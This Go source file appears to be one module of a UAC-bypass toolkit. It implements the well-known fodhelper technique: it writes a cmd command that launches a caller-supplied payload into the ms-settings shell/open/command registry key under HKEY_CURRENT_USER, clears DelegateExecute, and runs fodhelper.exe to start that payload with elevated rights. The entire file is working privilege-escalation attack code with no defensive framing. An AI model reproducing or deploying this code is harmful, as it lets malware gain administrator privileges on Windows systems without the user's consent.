package guacbypasser

import (
	"fmt"
	"os/exec"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows/registry"
)

func w32_nt_once_fodHelper(p string) (error, Informer) {
	inf := Informer{
		Name: "fodhelper",
		Desc: "Bypass UAC using fodhelper and registry key manipulation",
		Id:   3,

		Type:   "Once",
		Module: "w32_nt_once_fodHelper",

		Fixed:   false,
		FixedIn: "",

		Admin:   false,
		Payload: true,
	}

	fPath, err := filepath.Abs(p)
	if err != nil {
		return err, inf
	}

	// Cmd command with arguments
	cmd := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fPath)
	if _, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.SET_VALUE); err != nil {

		return err, inf
	}

	// Open key in `Software\Classes\ms-settings\shell\open\command`
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	defer wk32.Close()
	if err != nil {
		return err, inf
	}

	// Set DEFAULT value to cmd
	if err := wk32.SetStringValue("", cmd); err != nil {
		return err, inf
	}

	// Set DelegateExecute to ""
	if err := wk32.SetStringValue("DelegateExecute", ""); err != nil {
		return err, inf
	}
	time.Sleep(3 * time.Second)

	// Execute fodhelper.exe
	if _, err := exec.Command("cmd", "/C", "C:\\Windows\\System32\\fodhelper.exe").Output(); err != nil {
		return err, inf
	}
	return nil, inf
}

// NewOnceFodHelper #add-some-info-please
func NewOnceFodHelper(p string) (error, Informer) { return w32_nt_once_fodHelper(p) }
